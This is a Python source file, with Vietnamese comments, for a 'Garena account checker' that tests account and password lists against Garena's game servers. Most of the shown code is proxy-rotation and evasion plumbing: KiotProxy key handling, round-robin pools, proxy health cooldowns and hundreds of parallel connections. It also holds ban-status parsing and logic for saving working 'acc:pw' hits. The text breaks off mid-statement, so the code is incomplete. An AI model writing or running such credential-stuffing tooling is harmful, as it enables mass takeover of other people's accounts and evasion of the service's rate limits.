import socket
import struct
import hashlib
import json
import os
import time
import sys
import random
import re
import unicodedata
from concurrent.futures import ThreadPoolExecutor, as_completed

# ===== FILE DIALOG SUPPORT =====
try:
    import tkinter as tk
    from tkinter import filedialog
    HAS_TKINTER = True
except ImportError:
    HAS_TKINTER = False
    print("⚠️ Không có tkinter, sẽ dùng chế độ nhập đường dẫn thủ công")

def select_file_dialog(title="Chọn file"):
    """Mở hộp thoại chọn file"""
    if not HAS_TKINTER:
        return input(f"{title}: ").strip()
    
    root = tk.Tk()
    root.withdraw()
    root.attributes('-topmost', True)
    
    file_path = filedialog.askopenfilename(
        title=title,
        filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
    )
    
    root.destroy()
    return file_path

def select_folder_dialog(title="Chọn thư mục"):
    """Mở hộp thoại chọn thư mục"""
    if not HAS_TKINTER:
        return input(f"{title}: ").strip()
    
    root = tk.Tk()
    root.withdraw()
    root.attributes('-topmost', True)
    
    folder_path = filedialog.askdirectory(title=title)
    
    root.destroy()
    return folder_path


class C:
    RESET  = "\033[0m"
    BOLD   = "\033[1m"
    DIM    = "\033[2m"
    # Foreground
    RED    = "\033[91m"
    GREEN  = "\033[92m"
    YELLOW = "\033[93m"
    BLUE   = "\033[94m"
    MAGENTA = "\033[95m"
    CYAN   = "\033[96m"
    WHITE  = "\033[97m"
    GRAY   = "\033[90m"
    # Background
    BG_GREEN  = "\033[42m"
    BG_RED    = "\033[41m"
    BG_YELLOW = "\033[43m"
    BG_BLUE   = "\033[44m"
    BG_CYAN   = "\033[46m"


def _enable_ansi():
    """Enable ANSI codes on Windows console and force UTF-8 output encoding."""
    if sys.platform == "win32":
        try:
            import ctypes
            kernel32 = ctypes.windll.kernel32
            kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)
        except Exception:
            pass
        try:
            sys.stdout.reconfigure(encoding='utf-8')
            sys.stderr.reconfigure(encoding='utf-8')
        except Exception:
            pass


_enable_ansi()


def _c(color: str, text: str) -> str:
    """Wrap text in ANSI color (noop if not a tty)."""
    if not sys.stdout.isatty():
        return text
    return f"{color}{text}{C.RESET}"


def _is_yes(value) -> bool:
    """Normalize common YES/TRUE flags from mixed API payload types."""
    if isinstance(value, bool):
        return value
    if isinstance(value, (int, float)):
        return value != 0
    if isinstance(value, str):
        return value.strip().upper() in {
            "YES", "Y", "TRUE", "1", "ON", "BAN", "BANNED"
        }
    return False


def _is_banned_info(ban_info) -> bool:
    """
    Detect active banned state from `banInfo` payload.
    Avoid treating every non-empty object as banned.
    """
    if ban_info is None:
        return False
    if _is_yes(ban_info):
        return True
    if isinstance(ban_info, str):
        s = ban_info.strip().lower()
        if not s:
            return False
        if s in {"no", "none", "null", "false", "0", "ok", "unbanned", "not_banned", "not banned"}:
            return False
        return "ban" in s and "unban" not in s
    if isinstance(ban_info, dict):
        if not ban_info:
            return False
        for key in ("isBan", "isBanned", "banned", "ban", "active"):
            if key in ban_info and _is_yes(ban_info.get(key)):
                return True
        for key in ("status", "state", "banStatus"):
            v = ban_info.get(key)
            if isinstance(v, str) and v.strip().lower() in {
                "banned", "ban", "active_ban", "is_banned", "locked"
            }:
                return True

        def _norm_ts(v):
            """Normalize supported timestamp variants to seconds."""
            return _norm_unix_ts(v)

        now_ts = int(time.time())

        # Common "ban until" keys from multiple APIs.
        for key in ("endTime", "banEndTime", "expireAt", "expiredAt", "unbanTime"):
            until = _norm_ts(ban_info.get(key))
            if until > now_ts:
                return True

        # banTime + unbanTime window (kientuong returns this shape).
        ban_at = _norm_ts(ban_info.get("banTime"))
        unban_at = _norm_ts(ban_info.get("unbanTime"))
        if ban_at and unban_at and ban_at <= now_ts < unban_at:
            return True
        if ban_at and not unban_at and ban_at <= now_ts:
            return True

        return False
    if isinstance(ban_info, (list, tuple, set)):
        return any(_is_banned_info(item) for item in ban_info)
    return False

def _norm_unix_ts(v) -> int:
    """Normalize unix seconds/milliseconds or datetime string into seconds."""
    try:
        t = int(float(v or 0))
        if t > 0:
            if t > 10_000_000_000:  # milliseconds
                t //= 1000
            return t
    except Exception:
        pass
    if isinstance(v, str):
        s = v.strip()
        if not s:
            return 0
        import datetime as _dt
        fmts = (
            '%Y-%m-%d %H:%M:%S',
            '%Y-%m-%dT%H:%M:%S',
            '%Y-%m-%dT%H:%M:%S.%f',
            '%H:%M:%S %d/%m/%Y',
            '%H:%M:%S %d-%m-%Y',
            '%d/%m/%Y %H:%M:%S',
            '%d-%m-%Y %H:%M:%S',
        )
        for fmt in fmts:
            try:
                return int(_dt.datetime.strptime(s, fmt).timestamp())
            except Exception:
                continue
        # ISO fallback (e.g. 2026-04-17T10:20:30+07:00 / Z)
        try:
            s_iso = s.replace('Z', '+00:00')
            return int(_dt.datetime.fromisoformat(s_iso).timestamp())
        except Exception:
            return 0
    return 0

def _fmt_unix_ts_vi(v) -> str:
    """Format unix timestamp to HH:MM:SS dd/mm/yyyy."""
    t = _norm_unix_ts(v)
    if not t:
        return ""
    try:
        import datetime as _dt
        return _dt.datetime.fromtimestamp(t).strftime('%H:%M:%S %d/%m/%Y')
    except Exception:
        return ""

def _scan_ban_signals(obj, now_ts: int = None) -> tuple:
    """
    Recursively scan nested payload for ban signals.
    Returns (has_ban_flag, max_future_ban_end_ts).
    """
    if now_ts is None:
        now_ts = int(time.time())

    has_flag = False
    max_future_end = 0

    def _walk(node):
        nonlocal has_flag, max_future_end
        if node is None:
            return
        if isinstance(node, dict):
            for k, v in node.items():
                lk = str(k).strip().lower()
                # Direct flag/status signal
                if lk in {"isban", "isbanned", "banned", "ban", "active", "banstatus", "status", "state"}:
                    if _is_yes(v):
                        has_flag = True
                    elif isinstance(v, str):
                        sv = v.strip().lower()
                        if sv in {"banned", "ban", "active_ban", "is_banned", "locked", "punished"}:
                            has_flag = True
                # Any likely "ban end" time field
                if any(tk in lk for tk in ("unban", "banend", "endtime", "expire", "expired")):
                    ts = _norm_unix_ts(v)
                    if ts > now_ts and ts > max_future_end:
                        max_future_end = ts
                _walk(v)
            return
        if isinstance(node, (list, tuple, set)):
            for item in node:
                _walk(item)
            return
        if isinstance(node, str):
            s = node.strip().lower()
            if s in {"banned", "ban", "active_ban", "is_banned", "locked", "punished"}:
                has_flag = True

    _walk(obj)
    return has_flag, max_future_end


def _print_banner():
    banner = f"""{C.CYAN}{C.BOLD}
  ██████╗  █████╗ ██████╗ ███████╗███╗   ██╗ █████╗ 
  ██╔════╝ ██╔══██╗██╔══██╗██╔════╝████╗  ██║██╔══██╗
  ██║  ███╗███████║██████╔╝█████╗  ██╔██╗ ██║███████║
  ██║   ██║██╔══██║██╔══██╗██╔══╝  ██║╚██╗██║██╔══██║
  ╚██████╔╝██║  ██║██║  ██║███████╗██║ ╚████║██║  ██║
   ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝╚═╝  ╚═╝
                ACCOUNT CHECKER
{C.YELLOW}  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
            {C.GREEN}⚡  Bản quyền thuộc về: {C.WHITE}{C.BOLD}HUỲNH TÚ{C.GREEN}  ⚡
{C.YELLOW}  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{C.RESET}"""
    print(banner)


try:
    import requests as _requests
    _requests.packages.urllib3.disable_warnings()
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

# ── Account Security Cache (from main_fixed_v4) ─────────────────────────────
# Cache security lookups per account to avoid repeated HTTP calls.
_acct_sec_cache: dict = {}          # uid → (security_dict, timestamp)
_acct_sec_cache_lock = __import__('threading').Lock()
_ACCT_SEC_CACHE_TTL = 600.0         # 10 minutes

# ── FB Avatar Check Cache (from main_fixed_v4) ──────────────────────────────
# Cache FB avatar status to avoid repeated graph API calls.
_fb_avatar_cache: dict = {}         # fb_uid → (status, timestamp)
_fb_avatar_cache_lock = __import__('threading').Lock()
_FB_AVATAR_CACHE_TTL = 1800.0       # 30 minutes
_FB_DEFAULT_PATTERNS = ("static.xx.fbcdn.net", "rsrc.php", "silhouette", "/default", "1018")
_FB_CUSTOM_PATTERNS = ("scontent", "fbcdn.net/v/")

# ── HTTP Session Pool (from main_fixed_v4) ──────────────────────────────────
# Reuse connections across checks to reduce TCP handshake overhead.
_http_sessions: dict = {}
_http_session_lock = __import__('threading').Lock()

def _get_http_session(proxy=None):
    """Get or create a reusable requests Session for connection keep-alive.

    ⚠️ CHỈ dùng cho stateless endpoints (Kiot API, SSO init, proxy check,
    recent games, FB avatar).  KHÔNG DÙNG cho stateful flows có cookie
    per-account (sale.lienquan callback/graphql, account/init).
    Các flow stateful phải dùng _requests.Session() cục bộ.
    """
    if not HAS_REQUESTS:
        return None
    key = str(proxy) if proxy else "__direct__"
    with _http_session_lock:
        sess = _http_sessions.get(key)
        if sess is not None:
            return sess
        sess = _requests.Session()
        sess.verify = False
        if proxy:
            sess.proxies = _get_http_proxies(proxy)
        adapter = _requests.adapters.HTTPAdapter(
            pool_connections=50, pool_maxsize=100, max_retries=0,
        )
        sess.mount("https://", adapter)
        sess.mount("http://", adapter)
        _http_sessions[key] = sess
        return sess

# sale.lienquan / connect.garena đôi khi chặn request thiếu UA (urllib3/python-requests).
_AOV_MOBILE_UA = (
    "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/119.0.6045.193 Mobile Safari/537.36"
)
# Shop sale.lienquan trên trình duyệt Windows thường dùng UA desktop + cookie session/sig sau callback.
_SALE_LQ_DESKTOP_UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36"
)

# ── Server ──────────────────────────────────────────────────────────────────
HOST = "mconnect.gxx.garenanow.com"
PORT = 19000
_HOST_IP = None  # resolved lazily on first connect
_HOST_IP_lock = __import__('threading').Lock()

def _resolve_host_ip(timeout: int = 2) -> str:
    """Resolve HOST to a connectable IP (DNS first, vài IP dự phòng, cache)."""
    global _HOST_IP
    if _HOST_IP:
        return _HOST_IP
    with _HOST_IP_lock:
        if _HOST_IP:
            return _HOST_IP

        candidate_ips = []
        try:
            infos = socket.getaddrinfo(HOST, PORT, socket.AF_INET, socket.SOCK_STREAM)
            for info in infos[:3]:
                ip = info[4][0]
                if ip not in candidate_ips:
                    candidate_ips.append(ip)
        except Exception:
            pass

        for ip in (f"103.247.205.{i}" for i in (14, 19, 22)):
            if ip not in candidate_ips:
                candidate_ips.append(ip)

        for ip in candidate_ips:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(timeout)
                s.connect((ip, PORT))
                s.close()
                _HOST_IP = ip
                return ip
            except Exception:
                continue

        try:
            _HOST_IP = socket.gethostbyname(HOST)
        except Exception:
            _HOST_IP = candidate_ips[0] if candidate_ips else HOST
        return _HOST_IP

def _make_fast_socket(timeout: int = 20):
    """Create a socket optimized for speed and fast close on Windows."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))
    sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    sock.settimeout(timeout)
    return sock

# ── Proxy ───────────────────────────────────────────────────────────────────
# Static core: check(2).py-style round-robin on a pre-built list.
_proxy_list  = []   # merged: _static_proxies + resolved _rotating_proxies (ready for workers)
_static_proxies   = []  # ip:port / ip:port:user:pass loaded from file (never dropped)
_rotating_proxies = []  # resolved rotating proxies (Kiot) — refreshed independently
_proxy_idx  = 0
_proxy_lock = __import__('threading').Lock()

# Proxy health tracking
_proxy_health = {}     # proxy_tuple -> {'fails': int, 'cooldown_until': float}
_health_lock  = __import__('threading').Lock()
PROXY_COOLDOWN_S = float(os.environ.get("PROXY_COOLDOWN_S", "15"))
PROXY_MAX_FAILS  = int(os.environ.get("PROXY_MAX_FAILS", "3"))

# ── Rotating-proxy refresh bookkeeping ──────────────────────────────────────
_refresh_lock      = __import__('threading').Lock()
_last_refresh_mono = 0.0
_refresh_interval_s = 90
_refresh_thread    = None

# KiotProxy (https://api.kiotproxy.com): file có thể gồm key dạng K + hex, dòng region=bac|trung|nam|random, hoặc ip:port / ip:port:user:pass
_KIOT_API_BASE = "https://api.kiotproxy.com/api/v1"
_KIOT_REGION_ALLOWED = frozenset({"bac", "trung", "nam", "random"})
_KIOT_KEY_RE = re.compile(r"^K[0-9A-Fa-f]{16,64}$", re.IGNORECASE)
_kiot_keys = []  # list[str]
_px_keys = []
_top_keys = []
_kiot_region = "random"
_kiot_cache = {}  # key -> {proxy, exp_ms, last_good, fail_since_mono, next_request_at_ms}
_kiot_lock = __import__('threading').Lock()
_save_lock  = __import__('threading').Lock()

# ── Async File I/O Writer (queue + daemon thread) ──────────────────────────
# Thay vì lock mỗi lần _save(), dùng queue + 1 thread writer duy nhất
_save_queue = __import__('queue').Queue()
_save_writer_running = False
_save_writer_thread = None
_save_queue_lock = __import__('threading').Lock()

def _save_writer_daemon():
    """Daemon thread: ghi file từ queue theo batch (50 lines), chỉ 1 thread duy nhất."""
    import queue as _queue
    while True:
        batch = []
        try:
            task = _save_queue.get(timeout=0.5)
            if task is None:
                _save_queue.task_done()
                break
            batch.append(task)
            # Thu thập thêm tối đa 49 tasks
            for _ in range(49):
                try:
                    task = _save_queue.get_nowait()
                    if task is None:
                        _save_queue.task_done()
                        # Đánh dấu tất cả tasks còn lại trong batch
                        for t in batch:
                            _save_queue.task_done()
                        return
                    batch.append(task)
                except _queue.Empty:
                    break
        except _queue.Empty:
            continue
        except Exception:
            continue

        # Ghi batch: group theo file path
        by_path = {}
        for path, line, dedupe_key, seen_set in batch:
            if path not in by_path:
                by_path[path] = []
            by_path[path].append((line, dedupe_key, seen_set))

        for path, lines in by_path.items():
            try:
                os.makedirs(os.path.dirname(path), exist_ok=True)
                with open(path, "a", encoding="utf-8", newline="\n") as f:
                    for line, dedupe_key, seen_set in lines:
                        f.write(line if line.endswith("\n") else line + "\n")
                        if dedupe_key and seen_set is not None:
                            seen_set.add(dedupe_key)
            except Exception:
                pass

        # Đánh dấu tất cả tasks done
        for _ in batch:
            try:
                _save_queue.task_done()
            except Exception:
                pass

def _ensure_save_writer():
    """Khởi động daemon writer thread nếu chưa chạy."""
    global _save_writer_running, _save_writer_thread
    if _save_writer_running:
        return
    with _save_queue_lock:
        if _save_writer_running:
            return
        _save_writer_running = True
        _save_writer_thread = __import__('threading').Thread(
            target=_save_writer_daemon, daemon=True, name="save_writer"
        )
        _save_writer_thread.start()
_print_lock = __import__('threading').Lock()
_QUIET_BULK = False
_fetch_lean = True  # Giảm OAuth/SSO lặp (ít dòng lịch sử Garena Account Center / LQ)
_seen_save_keys = {}  # filepath -> set(keys) for dedupe
_hit_json_keys = set()  # acc:pw đã ghi vào res/account_details.json
_hit_json_loaded = False
# Speed tuning
BULK_MAX_ATTEMPTS = int(os.environ.get("BULK_MAX_ATTEMPTS", "3"))
BULK_RETRY_SLEEP  = float(os.environ.get("BULK_RETRY_SLEEP", "0.15"))
BULK_PRINT_INTERVAL = float(os.environ.get("BULK_PRINT_INTERVAL", "0.2"))
LOGIN_RETRIES_NO_PROXY = int(os.environ.get("LOGIN_RETRIES_NO_PROXY", "2"))
LOGIN_RETRIES_PROXY    = int(os.environ.get("LOGIN_RETRIES_PROXY", "3"))

# ── Optimized defaults ──────────────────────────────────────────────────────
os.environ.setdefault("FETCH_LEAN", "1")
os.environ.setdefault("CHECK_MAX_CONN", "400")
os.environ.setdefault("BULK_MAX_ATTEMPTS", "2")
os.environ.setdefault("BULK_RETRY_SLEEP", "0.06")
os.environ.setdefault("KIOT_STALE_AFTER_S", "300")

# ── Connection Semaphore ────────────────────────────────────────────────────
# Gioi han so socket TCP mo dong thoi, tranh Windows het ephemeral port (WinError 10048).
# Neu chay nhieu threads, day la cai fix thuc su — threads co the cao tuy muon
# nhung chi toi da _MAX_CONN socket duoc ket noi cung luc.
_MAX_CONN  = 200
_conn_sem  = __import__('threading').Semaphore(_MAX_CONN)

# Shared HTTP thread pool for parallel HTTP fetches during info retrieval
_HTTP_POOL      = None
_HTTP_POOL_LOCK = __import__('threading').Lock()

def _ensure_http_pool():
    global _HTTP_POOL
    if _HTTP_POOL is not None:
        return _HTTP_POOL
    with _HTTP_POOL_LOCK:
        if _HTTP_POOL is None:
            _HTTP_POOL = ThreadPoolExecutor(max_workers=600, thread_name_prefix='fc_http')
    return _HTTP_POOL

def _bulk_tune_connections(threads: int) -> None:
    global _conn_sem, _MAX_CONN
    env_mc = os.environ.get("CHECK_MAX_CONN", "").strip()
    if env_mc.isdigit():
        _MAX_CONN = max(1, int(env_mc))
    else:
        # Tăng đáng kể: threads * 12, capped at 350
        _MAX_CONN = min(450, max(150, threads * 15))
    _conn_sem = __import__('threading').Semaphore(_MAX_CONN)
    # Tăng socket timeout global
    socket.setdefaulttimeout(7)
def _kiot_parse_http(http_val: str):
    """Chuỗi 'host:port' từ API -> tuple (host, port, None, None)."""
    if not http_val or ":" not in http_val:
        return None
    host_part, port_s = http_val.rsplit(":", 1)
    host_part = host_part.strip()
    port_s = port_s.strip()
    if not host_part or not port_s.isdigit():
        return None
    return (host_part, int(port_s), None, None)


def _kiot_exp_ms(data) -> int:
    if not isinstance(data, dict):
        return 0
    try:
        return int(data.get("expirationAt") or 0)
    except (TypeError, ValueError):
        return 0


def _kiot_next_request_at_ms(data, now_ms: int) -> int:
    """Thời điểm (epoch ms) được phép gọi /proxies/new lại; thiếu field thì suy từ ttc."""
    if not isinstance(data, dict):
        return 0
    try:
        nr = int(data.get("nextRequestAt") or 0)
    except (TypeError, ValueError):
        nr = 0
    if nr > 0:
        return nr
    try:
        ttc = int(data.get("ttc") or 0)
    except (TypeError, ValueError):
        ttc = 0
    if ttc > 0:
        return now_ms + ttc * 1000
    return now_ms + 120_000


def _kiot_api_get(endpoint: str, params: dict):
    """Gọi API KiotProxy (không đi qua proxy xoay). Trả data dict hoặc None."""
    if not HAS_REQUESTS:
        return None
    url = f"{_KIOT_API_BASE.rstrip('/')}/{endpoint.lstrip('/')}"
    resp = _get_http_session(None).get(url, params=params, timeout=20, verify=False)
    try:
        body = resp.json()
    except Exception:
        return None
    if not isinstance(body, dict) or not body.get("success"):
        return None
    return body.get("data")


def _kiot_tuple_from_data(data):
    if not isinstance(data, dict):
        return None
    http_val = data.get("http")
    if isinstance(http_val, str):
        return _kiot_parse_http(http_val)
    return None


def _kiot_stale_after_s() -> float:
    """Sau bao nhiêu giây không gọi API được proxy mới thì dùng lại last_good."""
    try:
        v = float(os.getenv("KIOT_STALE_AFTER_S", "300") or 300)
    except ValueError:
        v = 120.0
    return max(1.0, v)


def _kiot_should_log_proxy() -> bool:
    """Khi co key Kiot trong file: mac dinh van in log (ca luc bulk quiet).

    Tat: CHECK_KIOT_LOG=0 | off | no
    Bat buoc tat ca (ca trace DIM): CHECK_KIOT_LOG=all
    """
    v = (os.getenv("CHECK_KIOT_LOG", "") or "").strip().lower()
    if v in ("0", "off", "no", "false"):
        return False
    if v in ("1", "yes", "true", "on", "y", "all"):
        return True
    if _kiot_keys:
        return True
    return not _QUIET_BULK


def _kiot_should_log_proxy_trace() -> bool:
    """Dong 'GET /new ...' (DIM): bulk quiet + Kiot chi in khi CHECK_KIOT_LOG=all."""
    v = (os.getenv("CHECK_KIOT_LOG", "") or "").strip().lower()
    if v == "all":
        return True
    return not _QUIET_BULK


def _kiot_key_preview(k: str) -> str:
    if not k:
        return "?"
    if len(k) <= 14:
        return k
    return f"{k[:6]}...{k[-4:]}"


def _kiot_extra_from_data(data) -> str:
    if not isinstance(data, dict):
        return ""
    bits = []
    loc = data.get("location")
    if loc:
        bits.append(f"loc={loc}")
    if data.get("ttl") is not None:
        bits.append(f"ttl={data.get('ttl')}s")
    if data.get("ttc") is not None:
        bits.append(f"ttc={data.get('ttc')}s")
    return (" | " + " | ".join(bits)) if bits else ""


def _kiot_proxy_log(msg: str, color: str = None):
    if not _kiot_should_log_proxy():
        return
    with _print_lock:
        if color:
            print(_c(color, msg))
        else:
            print(msg)


def _kiot_proxy_trace(msg: str):
    """Log tung buoc (DIM) — bulk + Kiot tat mac dinh de giam spam; dung CHECK_KIOT_LOG=all."""
    if not _kiot_should_log_proxy_trace():
        return
    with _print_lock:
        print(_c(C.DIM, msg))


def _kiot_resolve_proxy(key: str):
    """Lấy proxy HTTP qua KiotProxy.

    Khi đã tới lượt đổi (now >= nextRequestAt / hết ttc), luôn gọi /proxies/new trước để lấy IP mới.
    Chưa tới lượt thì dùng cache còn hạn hoặc /proxies/current.
    Nếu API lỗi liên tục, sau KIOT_STALE_AFTER_S giây trả last_good (proxy cũ đã từng dùng được).

    Log: co key Kiot thi mac dinh in ket qua (OK/loi/fallback) ca khi bulk quiet.
    Dong DIM 'GET ...': chi khi khong quiet hoac CHECK_KIOT_LOG=all.
    Tat log Kiot: CHECK_KIOT_LOG=0. Cache hit: CHECK_KIOT_LOG_CACHE=1.
    """
    if not key:
        return None
    if not HAS_REQUESTS:
        _kiot_proxy_log("[Kiot] thieu thu vien requests — khong goi duoc API proxy", C.RED)
        return None
    now_ms = int(time.time() * 1000)
    mono = time.monotonic()
    stale_s = _kiot_stale_after_s()
    kpv = _kiot_key_preview(key)
    log_cache = (os.getenv("CHECK_KIOT_LOG_CACHE", "") or "").strip().lower() in ("1", "yes", "true", "on", "y")

    def _merge_from_api(st, data, tpl, exp_use: int):
        if not isinstance(data, dict):
            data = {}
        st["proxy"] = tpl
        st["exp_ms"] = int(exp_use)
        st["last_good"] = tpl
        st["fail_since_mono"] = None
        st["next_request_at_ms"] = _kiot_next_request_at_ms(data, now_ms)
        return st

    with _kiot_lock:
        state = dict(_kiot_cache.get(key) or {})

        nr = int(state.get("next_request_at_ms") or 0)
        can_call_new = (nr == 0) or (now_ms >= nr)

        tpl = None
        exp_ms = 0
        data = None

        if can_call_new:
            _kiot_proxy_trace(f"[Kiot] key={kpv}  GET /proxies/new (region={_kiot_region}) ...")
            data = _kiot_api_get("proxies/new", {"key": key, "region": _kiot_region})
            if isinstance(data, dict):
                tpl = _kiot_tuple_from_data(data)
                exp_ms = _kiot_exp_ms(data)
            if tpl:
                exp_use = exp_ms if exp_ms > now_ms + 5000 else (exp_ms or (now_ms + 1_200_000))
                state = _merge_from_api(state, data, tpl, exp_use)
                _kiot_cache[key] = state
                ex = _kiot_extra_from_data(data)
                _kiot_proxy_log(
                    f"[Kiot] key={kpv}  /proxies/new OK -> {tpl[0]}:{tpl[1]}{ex}  (doi tiep sau nextRequestAt/ttc)",
                    C.GREEN,
                )
                return tpl
            if isinstance(data, dict):
                state["next_request_at_ms"] = _kiot_next_request_at_ms(data, now_ms)
                _kiot_cache[key] = state
                _kiot_proxy_log(
                    f"[Kiot] key={kpv}  /proxies/new: API success nhung khong doc duoc http (data co field khac?)",
                    C.YELLOW,
                )
            else:
                state["next_request_at_ms"] = max(nr, now_ms + 5_000)
                _kiot_cache[key] = state
                _kiot_proxy_log(
                    f"[Kiot] key={kpv}  /proxies/new THAT BAI (mang/KEY/het luot) — cho ~5s goi lai",
                    C.YELLOW,
                )

        p = state.get("proxy")
        exp = int(state.get("exp_ms") or 0)
        if p and exp > now_ms + 5000:
            state["last_good"] = p
            state["fail_since_mono"] = None
            _kiot_cache[key] = state
            if log_cache and (not _QUIET_BULK or __import__('random').random() < 0.1):
                _kiot_proxy_log(
                    f"[Kiot] key={kpv}  dung CACHE con han -> {p[0]}:{p[1]}  (het han ~{_fmt_unix_ts_vi(exp)})",
                    C.DIM,
                )
            return p

        _kiot_proxy_trace(f"[Kiot] key={kpv}  GET /proxies/current ...")
        data = _kiot_api_get("proxies/current", {"key": key})
        tpl = None
        exp_ms = 0
        if isinstance(data, dict):
            tpl = _kiot_tuple_from_data(data)
            exp_ms = _kiot_exp_ms(data)
        if tpl and exp_ms > now_ms + 5000:
            state = _merge_from_api(state, data, tpl, exp_ms)
            _kiot_cache[key] = state
            ex = _kiot_extra_from_data(data)
            _kiot_proxy_log(f"[Kiot] key={kpv}  /proxies/current OK -> {tpl[0]}:{tpl[1]}{ex}", C.CYAN)
            return tpl

        if tpl:
            exp_use = exp_ms or (now_ms + 1_200_000)
            state = _merge_from_api(state, data, tpl, exp_use)
            _kiot_cache[key] = state
            ex = _kiot_extra_from_data(data)
            _kiot_proxy_log(
                f"[Kiot] key={kpv}  /proxies/current OK -> {tpl[0]}:{tpl[1]}{ex} (expirationAt ngan, dung fallback)",
                C.CYAN,
            )
            return tpl

        last_good = state.get("last_good") or state.get("proxy")
        if state.get("fail_since_mono") is None:
            state["fail_since_mono"] = mono
        fail_since = float(state["fail_since_mono"])
        _kiot_cache[key] = state

        if last_good and (mono - fail_since) >= stale_s:
            _kiot_proxy_log(
                f"[Kiot] key={kpv}  FALLBACK last_good sau {int(mono - fail_since)}s loi API -> {last_good[0]}:{last_good[1]}",
                C.YELLOW,
            )
            return last_good

    _kiot_proxy_log(
        f"[Kiot] key={kpv}  KHONG lay duoc proxy (het cache, API fail, chua du {int(stale_s)}s de dung last_good)",
        C.RED,
    )
    return None





def load_proxies(filepath: str):
    """Load proxy file: ip:port[:user:pass], key KiotProxy (K + hex), hoặc region=bac|trung|nam|random."""
    global _proxy_list, _static_proxies, _rotating_proxies, _kiot_keys, _kiot_region, _kiot_cache
    proxies = []
    kiot_keys = []
    region = (os.getenv("KIOT_REGION", "random") or "random").strip().lower()
    if region not in _KIOT_REGION_ALLOWED:
        region = "random"

    with open(filepath, encoding="utf-8-sig") as f:
        for raw in f:
            line = raw.strip()
            if not line or line.startswith("#"):
                continue
            low = line.lower()
            if low.startswith("region="):
                v = line.split("=", 1)[1].strip().lower()
                if v in _KIOT_REGION_ALLOWED:
                    region = v
                continue
            
            if low.startswith("kiot:"):
                kiot_keys.append(line.split(":", 1)[1].strip())
                continue

            if _KIOT_KEY_RE.match(line):
                kiot_keys.append(line)
                continue

            parts = line.split(":")
            try:
                if len(parts) >= 4:
                    proxies.append((parts[0], int(parts[1]), parts[2], parts[3]))
                elif len(parts) >= 2:
                    proxies.append((parts[0], int(parts[1]), None, None))
            except (ValueError, IndexError):
                # Bỏ qua dòng proxy lỗi (port không hợp lệ, thiếu field, v.v.)
                continue

    _static_proxies = proxies
    _proxy_list = list(_static_proxies)
    _rotating_proxies = []
    _kiot_keys = kiot_keys
    _kiot_region = region

    with _kiot_lock:
        for rk in list(_kiot_cache.keys()):
            if rk not in kiot_keys:
                del _kiot_cache[rk]

    # ── Only pre-resolve when there are rotating keys.
    #    Pure static files (ip:port / ip:port:user:pass) skip this entirely
    #    and use check(2).py-style round-robin on _proxy_list directly.
    if _kiot_keys:
        _resolve_all_proxies()

    # Clear health records so cooldowns from previous session don't carry over
    _reset_proxy_health()


def _resolve_all_proxies():
    """Resolve KiotProxy rotating keys once and merge into _proxy_list.

    Static proxies (read from file) are preserved via _static_proxies.
    Each Kiot key is queried once via _kiot_resolve_proxy();
    the returned (ip, port, user, pw) tuples are merged so
    _next_proxy() can do simple round-robin.

    Returns the number of successfully resolved rotating proxies.
    """
    global _proxy_list, _rotating_proxies, _last_refresh_mono

    rotating = []
    # Always read from the separate _static_proxies array so private
    # authenticated proxies (ip:port:user:pass) are never lost.
    with _proxy_lock:
        static = list(_static_proxies)

    kiot_ok = 0
    for key in _kiot_keys:
        try:
            p = _kiot_resolve_proxy(key)
            if p:
                rotating.append(p)
                kiot_ok += 1
        except Exception:
            pass

    total_rot = kiot_ok
    with _proxy_lock:
        _rotating_proxies = rotating
        _proxy_list = static + rotating
    _last_refresh_mono = time.monotonic()

    if total_rot > 0:
        with _print_lock:
            print(_c(C.GREEN, f"[Proxy] Resolved {total_rot} rotating proxies "
                              f"(Kiot={kiot_ok}) — "
                              f"total pool={len(_proxy_list)}"))
    return total_rot


def _refresh_rotating_proxies():
    """Re-fetch rotating proxies in background if the refresh interval has passed.

    This is a fire-and-forget refresh: a daemon thread is spawned to call
    _resolve_all_proxies() so _next_proxy() never blocks on HTTP.
    Only one refresh runs at a time (_refresh_lock guards it).
    """
    global _refresh_thread

    if not _kiot_keys:
        return

    now = time.monotonic()
    if now - _last_refresh_mono < _refresh_interval_s:
        return

    if not _refresh_lock.acquire(blocking=False):
        return

    def _do_refresh():
        try:
            _resolve_all_proxies()
        except Exception:
            pass
        finally:
            _refresh_lock.release()

    try:
        t = __import__('threading').Thread(target=_do_refresh, daemon=True)
        t.start()
        _refresh_thread = t
    except Exception:
        _refresh_lock.release()
def _has_proxy_pool() -> bool:
    """True if there is any proxy ready in the merged pool."""
    return bool(_proxy_list)


def _mark_proxy_health(proxy, result: dict):
    """Mark proxy health based on check result status + detail.

    Good proxy  (reset fails): HIT, INVALID, NOT_FOUND, BANNED, SEC_BANNED,
                                MISS with skip codes (101/105/174/367).
    Bad proxy   (+1 fail):     TIMEOUT, PROXY_FAIL, CAPTCHA,
                               ERROR with proxy-related detail,
                               CONNECT failed, proxy closed connection.
    """
    if proxy is None:
        return
    status = result.get('status', '')
    detail = result.get('detail', '')

    # ── Good: server responded correctly, proxy is fine ──
    _SKIP_CODES = ('result=101', 'result=105', 'result=174', 'result=367')
    is_skip_miss = (status == 'MISS' and any(c in detail for c in _SKIP_CODES))
    is_good = (
        status in ('HIT', 'INVALID', 'NOT_FOUND', 'BANNED', 'SEC_BANNED') or
        is_skip_miss
    )

    # ── Bad: network/proxy issue ──
    _PROXY_ERRORS = ('proxy_error', 'Proxy closed', 'CONNECT failed',
